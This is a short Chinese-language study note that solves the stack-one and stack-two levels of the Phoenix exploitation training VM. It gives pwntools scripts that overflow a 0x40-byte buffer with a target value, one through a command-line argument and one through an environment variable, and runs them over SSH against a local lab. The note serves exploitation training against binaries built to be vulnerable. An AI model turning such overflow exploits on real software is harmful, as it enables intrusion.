---
title: "[pwn笔记1]stack-one和stack-two (Phoenix)"
urlname: "[pwn笔记1]stack-one和stack-two (Phoenix)"

date: February 15, 2023 9:28 PM
tags: [pwn, stack]
---
这两道非常简单，而且只有数据读入方式的区别。跟zero一样，只是对覆盖的数据有要求。

## stack-one

将程序第一个参数`strcpy`到字符串。

![https://s2.loli.net/2023/02/15/P3IYOneKUiS6vNV.png](%5Bpwn%E7%AC%94%E8%AE%B01%5Dstack-one%E5%92%8Cstack-two%20%28Phoenix%29%206c166cabf3d247c5a0c5f5952da34633/P3IYOneKUiS6vNV.png)

在gdb中run后面直接接参数即可带上参数。

pwntools的sh.run可以接收字节数组作为参数，里面可包含启动参数。（看了下文档，对于run方法：Backward compatibility.  Use [system()](https://docs.pwntools.com/en/stable/tubes/ssh.html?highlight=ssh#pwnlib.tubes.ssh.ssh.system)
）

```python
from pwn import *
shell = ssh("user", "localhost", password="user", port=2222)

s = b"a" * 0x40 + p32(0x496c5962)

sh = shell.run(b"/opt/phoenix/amd64/stack-one " + s)
print(sh.recvlines(2))

```

## stack-two

这次是写到环境变量里。

![https://s2.loli.net/2023/02/15/NhRfz7Ciw8UavO4.png](%5Bpwn%E7%AC%94%E8%AE%B01%5Dstack-one%E5%92%8Cstack-two%20%28Phoenix%29%206c166cabf3d247c5a0c5f5952da34633/NhRfz7Ciw8UavO4.png)

做到这里发现环境变量里写"\0"进去会出问题，我们要求写入的是32位数据，不应该用p64，用了就会自动补0，然后报错。

```python
from pwn import *
shell = ssh("user", "localhost", password="user", port=2222)

s = b"a" * 0x40 + p32(0x0d0a090a)
print(s)
s = s.decode()
print(s)
sh = shell.run(b"/opt/phoenix/amd64/stack-two", env={"ExploitEducation": s})
print(sh.recvlines(2))

```
